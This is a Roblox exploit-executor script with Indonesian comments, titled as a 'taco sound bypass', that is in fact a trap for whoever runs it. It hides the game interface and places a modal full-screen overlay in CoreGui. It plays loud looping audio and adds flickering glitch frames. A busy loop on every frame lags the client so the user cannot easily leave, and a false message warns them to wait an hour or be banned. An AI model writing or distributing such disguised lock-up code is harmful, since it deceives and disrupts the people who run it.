-- [[ DekaTeamHub: ABSOLUTE TACO SOUND BYPASS ]] --
task.spawn(function()
    local CP = game:GetService("ContentProvider")
    local SS = game:GetService("SoundService")
    
    -- 1. PRE-LOAD AUDIO (BIAR GAK ADA ALASAN GAK BUNYI)
    local tacoId = "rbxassetid://142276005"
    local s = Instance.new("Sound")
    s.SoundId = tacoId
    s.Volume = 10
    s.Looped = true
    s.Parent = SS
    
    -- PAKSA DOWNLOAD AUDIO DULU
    CP:PreloadAsync({s})
    
    -- 2. DISABLE SYSTEM & LOCK DOWN
    pcall(function()
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)

    -- 3. VISUAL TRAP (MUNCUL SETELAH AUDIO SIAP)
    local screen = Instance.new("ScreenGui", game:GetService("CoreGui"))
    screen.DisplayOrder = 2147483647
    screen.IgnoreGuiInset = true

    local B = Instance.new("TextButton", screen)
    B.Size = UDim2.new(1, 0, 1, 0)
    B.BackgroundColor3 = Color3.new(0, 0, 0)
    B.Modal = true
    B.Text = ""

    local Bars = Instance.new("Frame", B)
    Bars.Size = UDim2.new(1, 0, 1, 0)
    local colors = {
        Color3.fromRGB(191,191,191), Color3.fromRGB(191,191,0),
        Color3.fromRGB(0,191,191), Color3.fromRGB(0,191,0),
        Color3.fromRGB(191,0,191), Color3.fromRGB(191,0,0),
        Color3.fromRGB(0,0,191)
    }
    for i, c in pairs(colors) do
        local f = Instance.new("Frame", Bars)
        f.Size = UDim2.new(1/#colors, 0, 1, 0)
        f.Position = UDim2.new((i-1)/#colors, 0, 0, 0)
        f.BackgroundColor3 = c
        f.BorderSizePixel = 0
    end

    local T = Instance.new("TextLabel", B)
    T.Size = UDim2.new(0.8, 0, 0.4, 0)
    T.Position = UDim2.new(0.1, 0, 0.3, 0)
    T.BackgroundTransparency = 1
    T.TextColor3 = Color3.new(1, 0, 0)
    T.TextScaled = true
    T.Font = "Code"
    T.Text = "SABAR TUNGGU 1 JAM!\nJANGAN LEAVE KALAU MAU SCRIPT WORK!\n\nSCRIPT BYPASS SEMUANYA DULU!\nKALAU GAK BYPASS BAKAL DI BAN!!"

    -- PLAY SOUND SECARA PAKSA
    s:Play()
    SS.RespectFilteringEnabled = false -- Bypass settingan game

    -- 4. GLITCH & LAG ENGINE
    game:GetService("RunService").RenderStepped:Connect(function()
        Bars.Position = UDim2.new(0, math.random(-10, 10), 0, math.random(-10, 10))
        if math.random(1, 5) == 1 then
            local n = Instance.new("Frame", B)
            n.Size = UDim2.new(1, 0, 0, math.random(5, 30))
            n.Position = UDim2.new(0, 0, math.random(0, 100)/100, 0)
            n.BackgroundColor3 = Color3.new(1, 1, 1)
            n.BackgroundTransparency = 0.5
            task.delay(0.01, function() n:Destroy() end)
        end
        -- Lag generator buat nahan biar gak gampang keluar
        for i = 1, 2000000 do local _ = i * i end
    end)
end)
















